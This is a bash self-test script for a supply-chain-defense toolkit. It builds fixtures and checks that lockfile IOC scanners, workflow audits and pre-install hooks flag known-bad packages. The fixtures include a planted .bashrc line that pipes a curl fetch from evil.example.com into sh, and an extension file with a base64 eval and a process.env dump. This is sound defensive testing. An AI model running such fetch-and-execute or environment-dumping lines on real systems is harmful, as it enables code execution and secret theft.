#!/usr/bin/env bash
# Self-test for supply-chain-defense scripts + hook.
#
# Offline-deterministic (no network). Builds throwaway fixtures, asserts the
# documented exit codes and key output of each script and the pre-install-scan
# hook, then cleans up. Resolves paths relative to itself so it works both in the
# repo and once installed to ~/.claude/skills/supply-chain-defense/.
#
# Usage:   bash tests/run.sh
# Exit:    0 all pass, 1 one or more failures
#
# Network-dependent checks (preinstall-check registry lookups) are intentionally
# omitted here — run that script manually against live registries.

set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SKILL="$(dirname "$HERE")"
SCRIPTS="$SKILL/scripts"
HOOK="$SKILL/../../hooks/pre-install-scan.sh"   # repo root/hooks or ~/.claude/hooks
MHOOK="$SKILL/../../hooks/manifest-dep-scan.sh"
SCAN="$SKILL/scripts/scan-extensions.sh"
# Pick a python that actually executes — skips the Windows Store `python3` stub
# (an app-execution alias that exits non-zero non-interactively).
PYTHON=""
for c in python python3 py; do
  if command -v "$c" >/dev/null 2>&1 && "$c" -c "" >/dev/null 2>&1; then PYTHON="$c"; break; fi
done
[[ -z "$PYTHON" ]] && { echo "no working python found" >&2; exit 1; }
SB="$(mktemp -d)"; trap 'rm -rf "$SB"' EXIT

PASS=0; FAIL=0
ok() { PASS=$((PASS+1)); printf '  PASS  %s\n' "$1"; }
no() { FAIL=$((FAIL+1)); printf '  FAIL  %s\n' "$1"; }
expect_exit() { [[ "$2" == "$3" ]] && ok "$1 (exit $3)" || no "$1 (want $2 got $3)"; }
expect_has()  { case "$3" in *"$2"*) ok "$1";; *) no "$1 (missing '$2')";; esac; }

echo "=== supply-chain-defense self-test ==="

# ── exposure-check.py ──────────────────────────────────────────────────────
echo "-- exposure-check.py --"
"$PYTHON" "$SCRIPTS/exposure-check.py" --help >/dev/null 2>&1; expect_exit "--help" 0 $?

mkdir -p "$SB/exposed" "$SB/clean"
printf '{"name":"a","lockfileVersion":3,"packages":{"node_modules/axios":{"version":"1.14.1"}}}' > "$SB/exposed/package-lock.json"
printf '{"name":"b","lockfileVersion":3,"packages":{"node_modules/axios":{"version":"1.7.9"}}}'  > "$SB/clean/package-lock.json"

out="$("$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/exposed" --no-extensions --findings-only 2>&1)"; rc=$?
expect_exit "exposed tree -> 10" 10 "$rc"
expect_has  "exposed tree names axios" "axios@1.14.1" "$out"

"$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/clean" --no-extensions --findings-only >/dev/null 2>&1
expect_exit "clean tree -> 0" 0 $?

"$PYTHON" "$SCRIPTS/exposure-check.py" --catalog "$SB/nope.json" --root "$SB/clean" >/dev/null 2>&1
expect_exit "missing catalog -> 3" 3 $?

# composer.lock + "*" wildcard IOC (Laravel-Lang tag-rewrite model: every version poisoned)
mkdir -p "$SB/php"
printf '{"packages":[{"name":"laravel-lang/lang","version":"15.30.0"},{"name":"monolog/monolog","version":"3.7.0"}]}' > "$SB/php/composer.lock"
out="$("$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/php" --no-extensions --findings-only 2>&1)"; rc=$?
expect_exit "composer wildcard IOC -> 10" 10 "$rc"
expect_has  "flags laravel-lang/lang (any version)" "laravel-lang/lang@15.30.0" "$out"

# editor-extension inventory + IOC (Nx Console / GitHub-breach vector)
mkdir -p "$SB/ext/nrwl.angular-console-18.95.0" "$SB/ext/ms-python.python-1.0.0"
printf '{"publisher":"nrwl","name":"angular-console","version":"18.95.0"}' > "$SB/ext/nrwl.angular-console-18.95.0/package.json"
printf '{"publisher":"ms-python","name":"python","version":"1.0.0"}' > "$SB/ext/ms-python.python-1.0.0/package.json"
out="$(SC_EXT_DIRS="$SB/ext" "$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/clean" --findings-only 2>&1)"; rc=$?
expect_exit "editor-extension IOC -> 10" 10 "$rc"
expect_has  "flags Nx Console 18.95.0" "nrwl.angular-console@18.95.0" "$out"

# new ecosystem (Cargo) parsing + match via a custom catalog
mkdir -p "$SB/rust"
printf '[[package]]\nname = "evilcrate"\nversion = "6.6.6"\n' > "$SB/rust/Cargo.lock"
printf '{"schema_version":"v0.1.0","entries":[{"id":"T","name":"t","ecosystem":"cargo","package":"evilcrate","versions":["6.6.6"],"severity":"critical"}]}' > "$SB/cat.json"
out="$("$PYTHON" "$SCRIPTS/exposure-check.py" --catalog "$SB/cat.json" --root "$SB/rust" --no-extensions --findings-only 2>&1)"; rc=$?
expect_exit "cargo lockfile IOC -> 10" 10 "$rc"
expect_has  "flags cargo crate" "evilcrate@6.6.6" "$out"

# frontend lockfiles — pnpm + yarn (FED teams); axios 1.14.1 is the seeded IOC
mkdir -p "$SB/pnpm" "$SB/yarn"
printf 'packages:\n  axios@1.14.1:\n    resolution: {integrity: x}\n  vite@5.4.0(@types/node@20.0.0):\n    resolution: {integrity: y}\n' > "$SB/pnpm/pnpm-lock.yaml"
"$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/pnpm" --no-extensions --findings-only >/dev/null 2>&1
expect_exit "pnpm-lock.yaml IOC -> 10" 10 $?
printf 'axios@^1.0.0, axios@^1.2.0:\n  version "1.14.1"\n' > "$SB/yarn/yarn.lock"
"$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/yarn" --no-extensions --findings-only >/dev/null 2>&1
expect_exit "yarn.lock IOC -> 10" 10 $?
mkdir -p "$SB/bun"
printf '{"packages":{"axios":["axios@1.14.1","",{}],"vite":["vite@5.4.0","",{}]}}' > "$SB/bun/bun.lock"
"$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/bun" --no-extensions --findings-only >/dev/null 2>&1
expect_exit "bun.lock IOC -> 10" 10 $?
# durabletask PyPI IOC (added this pass) — *.dist-info/METADATA path
mkdir -p "$SB/py/durabletask-1.4.2.dist-info"
printf 'Name: durabletask\nVersion: 1.4.2\n' > "$SB/py/durabletask-1.4.2.dist-info/METADATA"
out="$("$PYTHON" "$SCRIPTS/exposure-check.py" --root "$SB/py" --no-extensions --findings-only 2>&1)"; rc=$?
expect_exit "durabletask IOC -> 10" 10 "$rc"
expect_has  "flags durabletask 1.4.2" "durabletask@1.4.2" "$out"

# ── integrity-audit.sh ─────────────────────────────────────────────────────
echo "-- integrity-audit.sh --"
bash "$SCRIPTS/integrity-audit.sh" --help >/dev/null 2>&1; expect_exit "--help" 0 $?

mkdir -p "$SB/proj/.github/workflows"
cat > "$SB/proj/.github/workflows/x.yml" <<'YML'
on:
  pull_request_target:
permissions:
  id-token: write
jobs: { b: { runs-on: ubuntu-latest, steps: [ { run: "npm publish" } ] } }
YML
out="$(bash "$SCRIPTS/integrity-audit.sh" "$SB/proj" 2>&1)"; rc=$?
expect_exit "planted OIDC workflow -> 10" 10 "$rc"
expect_has  "flags id-token workflow" "id-token" "$out"
# shell-rc persistence (HOME override → deterministic, isolated from real machine)
mkdir -p "$SB/fakehome" "$SB/empty"
printf 'export X=1\ncurl http://evil.example.com/p | sh\n' > "$SB/fakehome/.bashrc"
out="$(HOME="$SB/fakehome" bash "$SCRIPTS/integrity-audit.sh" "$SB/empty" 2>&1)"; rc=$?
expect_exit "shell-rc persistence -> 10" 10 "$rc"
expect_has  "flags shell_rc" "shell_rc" "$out"

# ── preinstall-check.sh (offline bits only) ────────────────────────────────
echo "-- preinstall-check.sh --"
bash "$SCRIPTS/preinstall-check.sh" --help >/dev/null 2>&1; expect_exit "--help" 0 $?
bash "$SCRIPTS/preinstall-check.sh" --bogus >/dev/null 2>&1; expect_exit "bad flag -> 2" 2 $?
bash "$SCRIPTS/preinstall-check.sh" >/dev/null 2>&1;        expect_exit "no args -> 2" 2 $?

# ── pre-install-scan.sh hook (both input modes) ────────────────────────────
echo "-- pre-install-scan.sh hook --"
if [[ -f "$HOOK" ]]; then
  # legacy $1 arg mode
  out="$(bash "$HOOK" "npm install lodash" 2>&1)"; rc=$?
  expect_exit "arg: npm install advisory -> 0" 0 "$rc"
  expect_has  "arg: advisory text" "SUPPLY CHAIN" "$out"
  # modern stdin-JSON mode
  out="$(printf '{"tool_input":{"command":"pip install requests"}}' | bash "$HOOK" 2>&1)"; rc=$?
  expect_exit "stdin: pip install advisory -> 0" 0 "$rc"
  expect_has  "stdin: advisory text" "SUPPLY CHAIN" "$out"
  # composer update — the PHP/Composer tag-rewrite vector (Laravel-Lang)
  out="$(printf '{"tool_input":{"command":"composer update"}}' | bash "$HOOK" 2>&1)"; rc=$?
  expect_exit "stdin: composer update advisory -> 0" 0 "$rc"
  expect_has  "composer update flagged" "composer" "$out"
  # already-wrapped is silent
  out="$(printf '{"tool_input":{"command":"socket npm install x"}}' | bash "$HOOK" 2>&1)"; rc=$?
  expect_exit "stdin: socket-wrapped silent -> 0" 0 "$rc"
  [[ -z "$out" ]] && ok "stdin: socket-wrapped produces no output" || no "stdin: socket-wrapped should be silent"
  # hard gate
  printf '{"tool_input":{"command":"npm install evil"}}' | SUPPLY_CHAIN_BLOCK=1 bash "$HOOK" >/dev/null 2>&1
  expect_exit "block mode -> 2" 2 $?
else
  echo "  SKIP  hook not found at $HOOK"
fi

# ── manifest-dep-scan.sh hook (the agent-edits-manifest path) ──────────────
echo "-- manifest-dep-scan.sh hook --"
if [[ -f "$MHOOK" ]]; then
  out="$(printf '{"tool_input":{"file_path":"/p/package.json","new_string":"\\"axios\\": \\"^1.14.1\\""}}' | bash "$MHOOK")"; rc=$?
  expect_exit "manifest dep-add advisory -> 0" 0 "$rc"
  expect_has  "manifest advisory text" "SUPPLY CHAIN" "$out"
  out="$(printf '{"tool_input":{"file_path":"/p/package.json","new_string":"\\"version\\": \\"2.0.0\\""}}' | bash "$MHOOK")"
  [[ -z "$out" ]] && ok "version-bump is silent (no false fire)" || no "version bump should not fire"
  out="$(printf '{"tool_input":{"file_path":"/p/src/index.js","new_string":"const x=1"}}' | bash "$MHOOK")"
  [[ -z "$out" ]] && ok "non-manifest edit is silent" || no "non-manifest should not fire"
else
  echo "  SKIP  manifest-dep-scan hook not found at $MHOOK"
fi

# ── scan-extensions.sh (inventory + refuse-don't-degrade + behavioural) ────
echo "-- scan-extensions.sh --"
bash "$SCAN" --help >/dev/null 2>&1; expect_exit "scan --help" 0 $?
mkdir -p "$SB/exts/pub.tool-1.0.0"
printf '{"publisher":"pub","name":"tool","version":"1.0.0"}' > "$SB/exts/pub.tool-1.0.0/package.json"
SC_EXT_DIRS="$SB/exts" bash "$SCAN" -q >/dev/null 2>&1; expect_exit "inventory (zero-dep) -> 0" 0 $?
# --deep without engine: skips behavioural gracefully (exit 0) + LOUD recommendation,
# never a false-clean. Lean default keeps guarddog/semgrep off the machine.
out="$(PATH="/usr/bin:/bin" bash "$SCAN" --deep 2>&1)"; rc=$?
expect_exit "--deep w/o engine skips (not fail) -> 0" 0 "$rc"
expect_has  "skip notice recommends install" "uv tool install guarddog semgrep" "$out"
expect_has  "skip notice is loud (not a clean verdict)" "SKIPPED" "$out"
# --deep behavioural finding — only when the engine is actually present
if command -v guarddog >/dev/null 2>&1 && semgrep --version >/dev/null 2>&1; then
  mkdir -p "$SB/evil/bad.x-1.0.0"
  printf 'eval(Buffer.from("Y29uc29sZS5sb2coMSk=","base64").toString());\nconst e=JSON.stringify(process.env);\n' > "$SB/evil/bad.x-1.0.0/extension.js"
  printf '{"publisher":"bad","name":"x","version":"1.0.0"}' > "$SB/evil/bad.x-1.0.0/package.json"
  SC_EXT_DIRS="$SB/evil" bash "$SCAN" --deep --all >/dev/null 2>&1
  expect_exit "--deep behavioural finding -> 10" 10 $?
else
  echo "  SKIP  --deep behavioural (guarddog/semgrep not installed)"
fi

# ── summary ────────────────────────────────────────────────────────────────
echo "=== $PASS passed, $FAIL failed ==="
[[ "$FAIL" -eq 0 ]] || exit 1
